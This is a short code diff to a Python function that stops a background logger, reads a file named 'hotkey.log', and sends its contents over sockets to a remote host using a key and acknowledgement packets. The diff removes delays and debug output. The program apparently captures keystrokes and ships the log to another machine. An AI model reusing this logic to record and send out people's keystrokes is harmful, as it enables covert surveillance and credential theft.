@@ -1164,7 +1164,6 @@ def stop_bg(ctx: Context):
     
     print("Stopping background logger...")
     stop_logger()
-    time.sleep(0.5)  # Wait for logger to fully stop
 
     source_ip = detect_source_ip(ctx.connected_to)
     try:
@@ -1177,10 +1176,6 @@ def stop_bg(ctx: Context):
 
     try:
         send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
-        print(f"[BG] ACK_READY sent to {ctx.connected_to}")
-        
-        # CRITICAL FIX: Give hosta time to start listening
-        time.sleep(0.5)
 
         log_content = get_hotkey_log_content("hotkey.log")
         print(f"[BG] Sending log ({len(log_content)} bytes)...")
@@ -1191,14 +1186,6 @@ def stop_bg(ctx: Context):
             print("[BG] Log sent successfully")
         else:
             print("[BG] Log send failed")
-            
-            # Debug: Check if any packets were received
-            recv_socket.settimeout(0.5)
-            try:
-                packet, _ = recv_socket.recvfrom(65535)
-                print(f"[BG] Debug: Received unexpected packet: {len(packet)} bytes")
-            except socket.timeout:
-                print("[BG] Debug: No packets waiting")
     finally:
         recv_socket.close()
         send_socket.close()
